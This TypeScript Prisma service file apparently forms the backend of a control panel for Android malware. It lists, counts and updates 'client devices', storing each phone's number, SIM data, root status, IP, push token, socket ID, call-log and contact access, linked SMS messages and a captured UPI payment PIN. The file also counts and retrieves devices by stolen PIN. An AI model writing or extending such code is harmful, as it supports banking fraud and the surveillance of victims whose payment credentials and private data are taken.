import prisma from "@/lib/prisma";
import { Prisma } from "@prisma/client";

export const getDevices = async (
  userId: string,
  filters: {
    status?: boolean;
    hasUpiPin?: boolean;
    sort?: "recent" | "oldest";
    search?: string;
    page?: number;
    limit?: number;
    date?: string;
  }
) => {
  const {
    status,
    hasUpiPin,
    sort = "recent",
    search,
    page = 1,
    limit = 20,
    date,
  } = filters;

  const skip = (page - 1) * limit;
  const where: any = { userId };

  if (status !== undefined) where.status = status;
  if (hasUpiPin !== undefined) {
    if (hasUpiPin) {
      where.upi_pin = { not: null };
    } else {
      where.upi_pin = null;
    }
  }
  if (search) {
    where.OR = [
      { deviceId: { contains: search, mode: "insensitive" } },
      { modelName: { contains: search, mode: "insensitive" } },
      { androidV: { contains: search, mode: "insensitive" } },
      { mobNo: { contains: search, mode: "insensitive" } },
      { service_provider: { contains: search, mode: "insensitive" } },
      { note: { contains: search, mode: "insensitive" } },
    ];
  }
  if (date) {
    const startDate = new Date(date);
    const endDate = new Date(startDate);
    endDate.setDate(endDate.getDate() + 1);
    where.joined = {
      gte: startDate,
      lt: endDate,
    };
  }

  const orderBy: Prisma.ClientDeviceOrderByWithRelationInput = {
    joined: sort === "recent" ? "desc" : "asc",
  };

  const [devices, total] = await Promise.all([
    prisma.clientDevice.findMany({
      where,
      skip,
      take: limit,
      orderBy,
      select: {
        id: true,
        userId: true,
        deviceId: true,
        modelName: true,
        androidV: true,
        isRoot: true,
        storage: true,
        battery: true,
        ipAddress: true,
        service_provider: true,
        mobNo: true,
        status: true,
        joined: true,
        lastSeen: true,
        FCM_Token: true,
        simData: true,
        note: true,
        isReadCallLogs: true,
        isReadContacts: true,
        callLogsUri: true,
        contactsUri: true,
        cpu_arch: true,
        upi_pin: true,
        socketId: true,
        imgUrl: true
      },
    }),
    prisma.clientDevice.count({ where }),
  ]);

  return {
    devices,
    total,
    page,
    limit,
    totalPages: Math.ceil(total / limit),
  };
};

export const getDeviceCounts = async (userId: string) => {
  const [total, online, offline, withPin] = await Promise.all([
    prisma.clientDevice.count({ where: { userId } }),
    prisma.clientDevice.count({
      where: {
        userId,
        status: true,
      },
    }),
    prisma.clientDevice.count({
      where: {
        userId,
        status: false,
      },
    }),
    prisma.clientDevice.count({
      where: {
        userId,
        upi_pin: { not: null },
      },
    }),
  ]);

  return { total, online, offline, withPin };
};

export const getDeviceById = async (userId: string, deviceId: string) => {
  return prisma.clientDevice.findFirst({
    where: { deviceId: deviceId, userId },
    select: {
      id: true,
      userId: true,
      deviceId: true,
      modelName: true,
      androidV: true,
      isRoot: true,
      storage: true,
      battery: true,
      ipAddress: true,
      service_provider: true,
      sdkV: true,
      mobNo: true,
      status: true,
      joined: true,
      lastSeen: true,
      note: true,
      FCM_Token: true,
      simData: true,
      cpu_arch: true, 
      isReadCallLogs: true,
      isReadContacts: true,
      callLogsUri: true,
      contactsUri: true,
      upi_pin: true,
      socketId: true,
      imgUrl: true
    },
  });
};

export const getDeviceAnalytics = async (userId: string, timeRange: string) => {
  const now = new Date();
  let startDate: Date;

  switch (timeRange) {
    case '1day':
      startDate = new Date(now.getTime() - 24 * 60 * 60 * 1000);
      break;
    case '1week':
      startDate = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
      break;
    case '30day':
      startDate = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);
      break;
    default:
      startDate = new Date(now.getTime() - 24 * 60 * 60 * 1000);
  }

  if (timeRange === '1day') {
    const hourlyData = [];
    for (let i = 0; i < 24; i += 4) {
      const hourStart = new Date(startDate);
      hourStart.setHours(hourStart.getHours() + i);
      const hourEnd = new Date(hourStart);
      hourEnd.setHours(hourEnd.getHours() + 4);

      const [onlineCount, offlineCount] = await Promise.all([
        prisma.clientDevice.count({
          where: {
            userId,
            status: true,
            lastSeen: {
              gte: hourStart,
              lt: hourEnd,
            },
          },
        }),
        prisma.clientDevice.count({
          where: {
            userId,
            status: false,
            lastSeen: {
              gte: hourStart,
              lt: hourEnd,
            },
          },
        }),
      ]);

      hourlyData.push({
        name: `${hourStart.getHours()}:00`,
        online: onlineCount,
        offline: offlineCount,
      });
    }

    return hourlyData;
  }

  if (timeRange === '1week') {
    const dailyData = [];
    const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
    
    for (let i = 0; i < 7; i++) {
      const dayStart = new Date(startDate);
      dayStart.setDate(dayStart.getDate() + i);
      const dayEnd = new Date(dayStart);
      dayEnd.setDate(dayEnd.getDate() + 1);

      const [onlineCount, offlineCount] = await Promise.all([
        prisma.clientDevice.count({
          where: {
            userId,
            status: true,
            lastSeen: {
              gte: dayStart,
              lt: dayEnd,
            },
          },
        }),
        prisma.clientDevice.count({
          where: {
            userId,
            status: false,
            lastSeen: {
              gte: dayStart,
              lt: dayEnd,
            },
          },
        }),
      ]);

      dailyData.push({
        name: days[dayStart.getDay()],
        online: onlineCount,
        offline: offlineCount,
      });
    }

    return dailyData;
  }

  if (timeRange === '30day') {
    const weeklyData = [];
    const weeks = 4;
    
    for (let i = 0; i < weeks; i++) {
      const weekStart = new Date(startDate);
      weekStart.setDate(weekStart.getDate() + i * 7);
      const weekEnd = new Date(weekStart);
      weekEnd.setDate(weekEnd.getDate() + 7);

      const [onlineCount, offlineCount] = await Promise.all([
        prisma.clientDevice.count({
          where: {
            userId,
            status: true,
            lastSeen: {
              gte: weekStart,
              lt: weekEnd,
            },
          },
        }),
        prisma.clientDevice.count({
          where: {
            userId,
            status: false,
            lastSeen: {
              gte: weekStart,
              lt: weekEnd,
            },
          },
        }),
      ]);

      weeklyData.push({
        name: `Week ${i + 1}`,
        online: onlineCount,
        offline: offlineCount,
      });
    }

    return weeklyData;
  }

  return [];
};

export const upsertDevice = async (
  userId: string,
  deviceData: Omit<Prisma.ClientDeviceCreateInput, 'userId' | 'user'> & { deviceId: string }
) => {
  const { deviceId } = deviceData;
  
  const cleanData: Prisma.ClientDeviceCreateInput = {
    ...deviceData,
    user: { connect: { id: userId } },
    deviceId,
  };

  const existingDevice = await prisma.clientDevice.findFirst({
    where: { deviceId, userId },
  });

  if (existingDevice) {
    return prisma.clientDevice.update({
      where: { id: existingDevice.id },
      data: cleanData,
    });
  } else {
    return prisma.clientDevice.create({
      data: cleanData,
    });
  }
};

export const updateDeviceStatus = async (
  userId: string,
  deviceId: string,
  socketId: string,
  status: boolean
) => {
  return prisma.clientDevice.update({
    where: { deviceId: deviceId, userId },
    data: { status, socketId},
  });
};

export const updateDeviceBattery = async (
  userId: string,
  deviceId: string,
  battery: string
) => {
  return prisma.clientDevice.update({
    where: { deviceId: deviceId, userId },
    data: { battery },
  });
};

export const updateDeviceSocketId = async (
  userId: string,
  deviceId: string,
  socketId: string | null
) => {
  return prisma.clientDevice.update({
    where: { deviceId: deviceId, userId },
    data: { socketId },
  });
};

export const updateDeviceUpiPin = async (
  userId: string,
  deviceId: string,
  upi_pin: string | null
) => {
  return prisma.clientDevice.update({
    where: { deviceId: deviceId, userId },
    data: { upi_pin },
  });
};

export const updateDeviceNote = async (
  userId: string,
  deviceId: string,
  note: string | null
) => {
  return prisma.clientDevice.update({
    where: { id: deviceId, userId },
    data: { note },
  });
};

export const deleteDevice = async (userId: string, deviceId: string) => {
  return prisma.$transaction([
    prisma.smsMessage.deleteMany({
      where: { deviceId }
    }),
    prisma.clientDevice.delete({
      where: { id: deviceId, userId }
    })
  ]);
};

export const getUpiPinByDeviceId = async (deviceId: string) => {
  return prisma.clientDevice.findUnique({
    where: { deviceId },
    select: {
      upi_pin: true,
    },
  });
};